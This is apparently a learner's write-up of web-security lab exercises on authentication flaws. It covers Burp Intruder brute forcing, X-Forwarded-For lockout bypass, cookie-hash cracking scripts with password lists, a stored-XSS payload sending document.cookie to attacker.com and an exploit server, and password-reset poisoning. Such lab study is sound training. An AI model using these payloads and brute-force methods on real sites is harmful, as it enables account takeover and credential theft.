<img src="images/image11-2.png" alt="third" width="600">

**Step1**

Try login with any character

<img src="images/image12.png" alt="third" width="600">

**Step2:**

In burpsuite see the login request

<img src="images/image13.png" alt="third" width="600">

**Step3:**

Send it to intruder. And select username and password

<img src="images/image14.png" alt="third" width="600">

Select cluster bomb attack

Payload1 setting  we add all username

<img src="images/image15.png" alt="third" width="600">

Payload2 setting  we dd all password

<img src="images/image16.png" alt="third" width="600">

Start attack

**Step4:**

Now we apply filter.

<img src="images/image17.png" alt="third" width="600">

Result:

<img src="images/image18.png" alt="third" width="600">

Username:albuquerque

Password:amanda

<img src="images/image19.png" alt="third" width="600">

**Step1:**

First we login with username and password

<img src="images/image20.png" alt="third" width="600">

**Step2:**

Send the POST /login request of username and password to repeater

<img src="images/image21.png" alt="third" width="600">

If we enter correct username and password it show normal time taken by request.

<img src="images/image22.png" alt="third" width="600">

If I increase the length of password the time get increase

<img src="images/image23.png" alt="third" width="600">

Another example

<img src="images/image24.png" alt="third" width="600">

But with different password combination our IP is block.

So we use

HTTP request with the `X-Forwarded-For` header

<img src="images/image25.png" alt="third" width="600">

Before adding a new ip it was not showing this 302 found it show 200 ok response

**Step3:**

Now we apply payload on IP address and username and set a large wrong password

Send the request to intruder and select attack type pitch fork

<img src="images/image26.png" alt="third" width="600">

**Payload 1**

<img src="images/image27.png" alt="third" width="600">

**Payload2**

<img src="images/image28.png" alt="third" width="500">

We have

<img src="images/image29.png" alt="third" width="500">

After adding response received and response completed from column we have above result and it is clear that username is ftp

**Step4:**

Now we find password using same method but change ip and use password wordlist instead of username

And set username to ftp

<img src="images/image30.png" alt="third" width="600">

Here is the result

<img src="images/image31.png" alt="third" width="600">

From the result it is clear that username is ftp and password is ginger

`Username:ftp`

`Password:ginger`

<img src="images/image31.png" alt="third" width="600">

**Step1:**

Login with given credential

<img src="images/image32.png" alt="third" width="600">

**Step2:**

Now I we analyze POST /login request in burpsuite we can see I we try three time wrong uername and password combination it say

<img src="images/image33.png" alt="third" width="600">

But we try two time wrong combination and correct combination third time it will allow

**Step3:**

To exploit this vulnerability we make a username list in which there is  sequence
```
Carlos
Carlos
Wiener
Carlos
Carlos
Wiener
```
And password list that contain
```
Password1
Password2
Wiener_pasword
Password3
Password4
Wiener_password
```
Script to make username wordlist

**Step4:**

Send request to repeater.

Select username and password and select attack type to pitch fork

<img src="images/image34.png" alt="third" width="600">

Payload1

<img src="images/image35.png" alt="third" width="600">

Payload2

<img src="images/image36.png" alt="third" width="600">

In resource pool make a custmom resource pool with conurrent request to 1

<img src="images/image37.png" alt="third" width="600">

Start attack

<img src="images/image38.png" alt="third" width="600">


Form the result it s clear that the only one carlos has 302 so this is correct password

Code for username and password
```
//#include<iostream>

//using namespace std;

//int main(){

//        for (int i=1;i<=200;i++){

//                if (i%2==0){

//                        cout<<"wiener\n";

//                }

//                else{

//                        cout<<"carlos\n";

//                }

//        }

//}
```
```
#include <iostream>

#include <string>

using namespace std;

int main() {

    std::string passwords[] = {

        "123456", "password", "12345678", "qwerty", "123456789", "12345",

        "1234", "111111", "1234567", "dragon", "123123", "baseball", "abc123",

        "football", "monkey", "letmein", "shadow", "master", "666666",

        "qwertyuiop", "123321", "mustang", "1234567890", "michael", "654321",

        "superman", "1qaz2wsx", "7777777", "121212", "000000", "qazwsx",

        "123qwe", "killer", "trustno1", "jordan", "jennifer", "zxcvbnm",

        "asdfgh", "hunter", "buster", "soccer", "harley", "batman", "andrew",

        "tigger", "sunshine", "iloveyou", "2000", "charlie", "robert",

        "thomas", "hockey", "ranger", "daniel", "starwars", "klaster",

        "112233", "george", "computer", "michelle", "jessica", "pepper",

        "1111", "zxcvbn", "555555", "11111111", "131313", "freedom",

        "777777", "pass", "maggie", "159753", "aaaaaa", "ginger", "princess",

        "joshua", "cheese", "amanda", "summer", "love", "ashley", "nicole",

        "chelsea", "biteme", "matthew", "access", "yankees", "987654321",

        "dallas", "austin", "thunder", "taylor", "matrix", "mobilemail",

        "mom", "monitor", "monitoring", "montana", "moon", "moscow"

    };

    int size = sizeof(passwords) / sizeof(passwords[0]);

    // Print the modified array

    for(int i = 0; i < size * 2; i++) {

        if (i % 2 == 0) {

            cout << passwords[i / 2] << endl;

        } else {

            cout << "peter" << endl;

        }

    }

    return 0;

}
```
<img src="images/image39.png" alt="third" width="600">

**Step1:**

First we try with random username and password

<img src="images/image40.png" alt="third" width="600">

**Step2:**

Send the post login request to intruder.

As we know if we user valid username multiple time with wrong password it show message too many wrong attempt.

So first we find valid username

<img src="images/image41.png" alt="third" width="600">

This is because we want to find a valid username…and in second we user null payload 5 time because after five 4 wrong attempt it say too many log in attempt

Attack type cluster bomb

Payload1

<img src="images/image42.png" alt="third" width="600">

Payload2

<img src="images/image44.png" alt="third" width="600">

Here is the result

<img src="images/image45.png" alt="third" width="600">

From here it is clear that username is affiliate

**Step3:**

Now we find password

In intruder we set username to affiliate and apply password liston password

Attack type will  be snipper

<img src="images/image46.png" alt="third" width="600">

We have the response

<img src="images/image47.png" alt="third" width="600">

For other we have incorrect and too many wrong attempt messages


<img src="images/image48.png" alt="third" width="600">


**Step1:**

Login with given credential and click on stay logged in

<img src="images/image49.png" alt="third" width="600">

**Step2:**

Now we see request in burpsuite

<img src="images/image50.png" alt="third" width="600">

If we decode stay-logged-in using base64

wiener:51dc30ddc473d43a6011e9ebba6ca770

And when we apply hash md5 crack on value it give

51dc30ddc473d43a6011e9ebba6ca770=peter

Based on python we use this script for generating hash value

import hashlib

import base64

List of passwords
```
password_list = [

    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111",

    "1234567", "dragon", "123123", "baseball", "abc123", "football", "monkey", "letmein",

    "shadow", "master", "666666", "qwertyuiop", "123321", "mustang", "1234567890", "michael",

    "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000", "qazwsx", "123qwe",

    "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster",

    "soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000",

    "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars", "klaster",

    "112233", "george", "computer", "michelle", "jessica", "pepper", "1111", "zxcvbn",

    "555555", "11111111", "131313", "freedom", "777777", "pass", "maggie", "159753",

    "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer", "love",

    "ashley", "nicole", "chelsea", "biteme", "matthew", "access", "yankees", "987654321",

    "dallas", "austin", "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor",

    "monitoring", "montana", "moon", "moscow"

]
```

Function to generate MD5 hash
```
def generate_md5_hash(password):

    md5_hash = hashlib.md5(password.encode()).hexdigest()

    return md5_hash

# Function to concatenate username and hashed password, then Base64 encode

def generate_base64_encoded_string(username, md5_hash):

    raw_string = f"{username}:{md5_hash}"

    base64_encoded = base64.b64encode(raw_string.encode()).decode()

    return base64_encoded

# Username to concatenate with

username = "carlos"

# Generate and print Base64 encoded strings for all passwords

for password in password_list:

    md5_hash = generate_md5_hash(password)

    base64_encoded_string = generate_base64_encoded_string(username, md5_hash)

    print(f"{base64_encoded_string}")
```

**Step3:**

Send the request to intruder

Remove ?id=wiener from GET /my-account?id=wiener

And add stay log in value for payload

<img src="images/image51.png" alt="third" width="600">

Payload1:

<img src="images/image52.png" alt="third" width="600">

In result it is clear that ….

<img src="images/image53.png" alt="third" width="600">

<img src="images/image55.png" alt="third" width="600">

**Step1:**

Login with given credential

<img src="images/image54.png" alt="third" width="600">

**Step2:**

In /my-Account request we can see stay-log in value

<img src="images/image56.png" alt="third" width="600">

If we decode stay-logged-in using base64

wiener:51dc30ddc473d43a6011e9ebba6ca770

And when we apply hash md5 crack on value it give

51dc30ddc473d43a6011e9ebba6ca770=peter

**Step3:**

As we know there I a cross-site in comment so first try to check if our own cookie are visible or not
```
<script>

document.location='http://attacker.com/steal?cookie=' + document.cookie;

</script>
```

<img src="images/image57.png" alt="third" width="600">

Now if I click on view post we can see stay-logged in value in url

<img src="images/image58.png" alt="third" width="600">

**Step4:**

Now we add expoilt server id and store in comment

```
<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
```

In my case
```
1. <script>document.location='https://exploit-0a6e005404a0eee785b1b2c3017500d7.exploit-server.net/'+document.cookie</script>
```

If we access log we can see

<img src="images/image59.png" alt="third" width="600">

Now we decode it url

stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz

Decode it base64

carlos:26323c16d5f4dabff3bb136f2460a943

<img src="images/image60.png" alt="third" width="600">

And we have useername carlos and password onceuponatime

**Step5:**

Log in and delete user carlos

<img src="images/image61.png" alt="third" width="600">

**Step1:**

Click on forgot password

<img src="images/image62.png" alt="third" width="600">

Type here username

<img src="images/image63.png" alt="third" width="600">

**Step2:**

Go to burpsuite and send /forgot-password to repeater

<img src="images/image64.png" alt="third" width="600">

Add X_Forwarded-Host and change username to carlo

<img src="images/image65.png" alt="third" width="600">

**Step3:**

Now we access the log and copy the Token and open a password reset link from email client and replace token with the token in log

<img src="images/image66.png" alt="third" width="600">

And we can see this below page for carlos user


<img src="images/image67.png" alt="third" width="600">

<img src="images/image68.png" alt="third" width="600">

And lab get solve

<img src="images/image69.png" alt="third" width="600">

**Step1:**

Login with given credential

**Step2:**

Now we change email .but first we enter different new password and confirm new password to check whatis the response

<img src="images/image70.png" alt="third" width="600">

So it print

`New passwords do not match`

Now we change the password

**Step3:**

In burp we have request

<img src="images/image72.png" alt="third" width="600">

Send it to intruder

Change username to carlos

Select password and bruteforce it with password list

New-password-1 and new-password-2 is different

<img src="images/image73.png" alt="third" width="600">

Insetting we add grep to `New passwords do not match`

<img src="images/image74.png" alt="third" width="600">

In result we have a carlos original password

<img src="images/image75.png" alt="third" width="600">
